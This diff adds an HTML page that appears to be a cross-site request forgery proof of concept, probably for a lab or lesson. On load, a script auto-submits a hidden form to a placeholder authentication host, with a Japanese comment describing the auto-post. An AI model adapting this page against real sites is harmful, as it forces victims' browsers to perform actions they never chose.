@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<head></head>
+<body>
+<form action="http://auth.example.com" method="post" id="form">
+    <input name="name" value="CSRF">
+</form>
+<script>
+    // 自動でpost送信させるコード
+    var form = document.getElementById("form");
+    form.submit()
+</script>
+</body>
+</html>
